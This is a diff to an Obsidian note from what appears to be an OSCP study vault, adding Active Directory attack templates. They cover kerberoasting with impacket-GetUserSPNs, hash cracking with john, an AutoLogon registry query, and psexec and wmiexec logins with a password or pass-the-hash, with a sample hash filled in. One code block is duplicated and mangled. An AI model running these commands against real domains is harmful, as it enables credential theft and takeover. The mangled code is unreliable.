@@ -148,7 +148,7 @@ Syncs our machine with the Domain server’s time as if we have more than a 5 mi
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `sudo ntpdate ${ip}`;
+const command = `sudo rdate -s ${ip}`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -175,13 +175,27 @@ gpp-decrypt [hash]
 
 Whenever getting access to domain credentials it is important to test a few of the tools from `impacket`. In this case we will use `GetUserSPNs.py` to extract encrypted passwords of any kerberoastable service accounts.
 
+User:: svc_loanmgr
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine"); const ip = page?.IP ?? "NO IP FOUND"; const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"; const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit"); const user = pagea?.["User"] ?? "NO USER FOUND";
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine"); const ip = page?.IP ?? "NO IP FOUND"; const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"; const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit"); const user = pagea?.["User"] ?? "NO USER FOUND"; // Fixed: changed page? to pagea? const command = `impacket-GetUserSPNs -request -dc-ip ${ip} ${discoveredDomain}/${user}`; dv.paragraph("```bash\n" + command + "\n```");
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const ip = page?.IP ?? "NO IP FOUND";
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
-const command = `impacket-GetUserSPNs -request -dc-ip ${ip} active.htb/SVC_TGS`;
+const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
+const user = pagea?.["User"] ?? "NO USER FOUND"; // Fixed: changed page? to pagea?
+
+const command = `impacket-GetUserSPNs -request -dc-ip ${ip} ${discoveredDomain}/${user}`;
 
 dv.paragraph("```bash\n" + command + "\n```");
+
 ```
+
 ```
 john -w=/usr/share/wordlists/rockyou.txt hash.txt
 ```
@@ -258,15 +272,24 @@ Transfer [[Rubeus.exe]] into VICTIM TARGET
 
 Once Creds are obtained, use [[Runas]]
 
+---
 
+# Priv Esc
+## whoami /priv
 [[SeManageVolume]]
 [[SeBackupPrivilege]]
 [[SeRestorePrivilege]]
 [[SeImpersonatePrivilege]]
 
+## AutoLogon
+```
+reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
+```
+
 ---
 
-# Admin SMB Login w Creds : psexec 
+## LOGINs
+# Admin SMB Login with Creds : psexec 
 
 Now that we have these credentials we can run `psexec.py`. This `impacket` tool requires 3 things. The user needs to be a local admin on the target machine, it must have SMB open, and they must have administrative privileges to the default `IPC$` share.
 ```dataviewjs
@@ -276,6 +299,23 @@ const command = `impacket-psexec ${discoveredDomain}/Administrator:'[PW}'@${ip}`
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+---
+
+## wmiexec
+
+MODIFY: 
+hash:: 823452073d75b9d1cf70ebdf86c7f98e
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
+const hash = pagea?.["hash"] ?? "NO HASH FOUND";
+
+const command = `impacket-wmiexec -hashes '${hash}' -dc-ip ${ip} administrator@${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
 
 
 
